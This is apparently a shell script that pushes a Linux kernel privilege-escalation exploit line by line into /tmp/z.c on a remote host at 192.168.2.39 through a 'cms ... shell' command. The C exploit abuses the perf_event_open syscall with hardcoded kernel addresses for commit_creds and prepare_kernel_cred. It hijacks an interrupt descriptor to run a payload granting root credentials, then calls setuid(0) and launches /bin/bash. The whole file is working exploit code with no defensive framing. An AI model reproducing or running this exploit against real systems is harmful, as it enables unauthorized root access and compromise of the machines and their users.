#!/usr/bin/env bash
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#define _GNU_SOURCE 1 > /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#include \<stdint.h\>>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#include \<stdio.h\>>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#include \<stdlib.h\>>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#include \<string.h\>>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#include \<unistd.h\>>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#include \<sys/mman.h\>>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#include \<syscall.h\>>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#include \<stdint.h\>>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#include \<assert.h\>>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo  >> /tmp/z.c " 
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#define BASE  0x1780000000>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#define SIZE  0x0010000000>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#define KSIZE 0x2000000>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo \#define AB\(x\) \(\(uint64_t\)\(\(0xababababLL\<\<32\)^\(\(uint64_t\)\(\(x\)\*313337\)\)\)\)>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo  >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo typedef int __attribute__\(\(regparm\(3\)\)\) \(\*commit_creds_fn\)\(unsigned long cred\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo typedef unsigned long __attribute__\(\(regparm\(3\)\)\) \(\*prepare_kernel_cred_fn\)\(unsigned long cred\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo uint64_t targets[3][3] =>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo             {{0xffffffff81ef67e0,  // perf_swevent_enabled>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo               0xffffffff81091630,  // commit_creds>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo               0xffffffff810918e0}, // prepare_kernel_cred>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo              {0xffffffff81ef67a0,>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo               0xffffffff81091220,>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo               0xffffffff810914d0},>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo              {0xffffffff81ef5940,>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo               0xffffffff8107ee30,>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo               0xffffffff8107f0c0}>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         }\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo void __attribute__\(\(regparm\(3\)\)\) payload\(\) {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     uint32_t \*fixptr = \(void\*\)AB\(1\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     // restore the handler>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     \*fixptr = -1\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     commit_creds_fn commit_creds = \(commit_creds_fn\)AB\(2\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     prepare_kernel_cred_fn prepare_kernel_cred = \(prepare_kernel_cred_fn\)AB\(3\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     commit_creds\(prepare_kernel_cred\(\(uint64_t\)NULL\)\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo }>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo  >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo void trigger\(uint32_t off\) {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     uint64_t buf[10] = { 0x4800000001, off, 0, 0, 0, 0x300 }\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     int fd = syscall\(298, buf, 0, -1, -1, 0\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     assert\( \!close\(fd\) \)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo }>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo  >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo int main\(int argc, char \*\*argv\) {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     uint64_t off64, needle, kbase, \*p\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     uint8_t \*code\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     uint32_t int_n, j = 5, target = 1337\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     int offset = 0\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     void \*map\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     assert\(argc == 2 \&\& \\\\\\\"target\?\\\\\\\"\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     assert\( \(target = atoi\(argv[1]\)\) \< 3 \)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     struct {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         uint16_t limit\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         uint64_t addr\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     } __attribute__\(\(packed\)\) idt\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     // mmap user-space block so we don\'t page fault>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     // on sw_perf_event_destroy>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     assert\(\(map = mmap\(\(void\*\)BASE, SIZE, 3, 0x32, 0,0\)\) == \(void\*\)BASE\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     memset\(map, 0, SIZE\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     asm volatile\(\\\\\\\"sidt %0\\\\\\\" : \\\\\\\"=m\\\\\\\" \(idt\)\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     kbase = idt.addr \& 0xff000000\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
# cms -i compiler____213 shell " echo     printf\(\\\\\\\"IDT addr = 0x%lx\\\\\\\\\\\\\n\\\\\\\", idt.addr\)\;>> /tmp/z.c "
cms -i 192.168.2.39 shell " echo     printf\(\\\\\\\"IDT addr = 0x%lx\\\\\n\\\\\\\", idt.addr\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     assert\(\(code = \(void\*\)mmap\(\(void\*\)kbase, KSIZE, 7, 0x32, 0, 0\)\) == \(void\*\)kbase\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     memset\(code, 0x90, KSIZE\)\; code += KSIZE-1024\; memcpy\(code, \&payload, 1024\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
# cms -i compiler____213 shell " echo     memcpy\(code-13,\\\\\\\"\\\\\\\\x0f\\\\\\\\x01\\\\\\\\xf8\\\\\\\\xe8\\\\\\\\\\\\\\\\5\\\\\\\\\\\\\\\\0\\\\\\\\\\\\\\\\0\\\\\\\\\\\\\\\\0\\\\\\\\x0f\\\\\\\\x01\\\\\\\\xf8\\\\\\\\x48\\\\\\\\xcf\\\\\\\", 13\)\;>> /tmp/z.c "
cms -i 192.168.2.39 shell " echo     memcpy\(code-13,\\\\\\\"\\\\\\\\x0f\\\\\\\\x01\\\\\\\\xf8\\\\\\\\xe8\\\\\5\\\\\0\\\\\0\\\\\0\\\\\\\\x0f\\\\\\\\x01\\\\\\\\xf8\\\\\\\\x48\\\\\\\\xcf\\\\\\\", 13\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     // can only play with interrupts 3, 4 and 0x80>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     for \(int_n = 3\; int_n \<= 0x80\; int_n++\) {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         for \(off64 = 0x00000000ffffffff\; \(int\)off64 \< 0\; off64--\) {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo             int off32 = off64\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo             if \(\(targets[target][0] + \(\(uint64_t\)off32\)\*24\) == \(idt.addr + int_n\*16 + 8\)\) {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo                 offset = off32\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo                 goto out\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo             }>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         }>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         if \(int_n == 4\) {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo             // shit, let\'s try 0x80 if the kernel is compiled with>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo             // CONFIG_IA32_EMULATION>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo             int_n = 0x80 - 1\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         }>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     }>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo out:>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     assert\(offset\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
# cms -i compiler____213 shell " echo     printf\(\\\\\\\"Using int = %d with offset = %d\\\\\\\\\\\\\n\\\\\\\", int_n, offset\)\;>> /tmp/z.c "
cms -i 192.168.2.39 shell " echo     printf\(\\\\\\\"Using int = %d with offset = %d\\\\\\\n\\\\\\\", int_n, offset\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     for \(j = 0\; j \< 3\; j++\) {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         needle = AB\(j+1\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         assert\(p = memmem\(code, 1024, \&needle, 8\)\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         \*p = \!j \? \(idt.addr + int_n \* 16 + 8\) : targets[target][j]\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     }>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     trigger\(offset\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     switch \(int_n\) {>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     case 3:>> /tmp/z.c "
echo $count ; count=$(($count+1))
# cms -i 192.168.2.39 shell " echo         asm volatile\(\\\\\\\"int \\\\\\\\$0x03\\\\\\\"\)\;>> /tmp/z.c "
cms -i 192.168.2.39 shell "echo     -n  asm volatile\(\\\\\\\"int  >> /tmp/z.c"
cms -i 192.168.2.39 shell "printf ' $%d' '0' >> /tmp/z.c"
cms -i 192.168.2.39 shell "echo         x03\\\\\\\"\)\;>> /tmp/z.c"
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         break\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     case 4:>> /tmp/z.c "
echo $count ; count=$(($count+1))
# cms -i 192.168.2.39 shell " echo         asm volatile\(\\\\\\\"int \$0x04\\\\\\\"\)\;>> /tmp/z.c "
cms -i 192.168.2.39 shell "echo     -n  asm volatile\(\\\\\\\"int  >> /tmp/z.c"
cms -i 192.168.2.39 shell "printf ' $%d' '0' >> /tmp/z.c"
cms -i 192.168.2.39 shell "echo         x04\\\\\\\"\)\;>> /tmp/z.c"
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo         break\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     case 0x80:>> /tmp/z.c "
echo $count ; count=$(($count+1))
# cms -i 192.168.2.39 shell " echo         asm volatile\(\\\\\\\"int \$0x80\\\\\\\"\)\;>> /tmp/z.c "
cms -i 192.168.2.39 shell "echo     -n  asm volatile\(\\\\\\\"int  >> /tmp/z.c"
cms -i 192.168.2.39 shell "printf ' $%d' '0' >> /tmp/z.c"
cms -i 192.168.2.39 shell "echo         x80\\\\\\\"\)\;>> /tmp/z.c"
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     }>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo >> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     assert\(\!setuid\(0\)\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo     return execl\(\\\\\\\"/bin/bash\\\\\\\", \\\\\\\"-sh\\\\\\\", NULL\)\;>> /tmp/z.c "
echo $count ; count=$(($count+1))
cms -i 192.168.2.39 shell " echo }>> /tmp/z.c "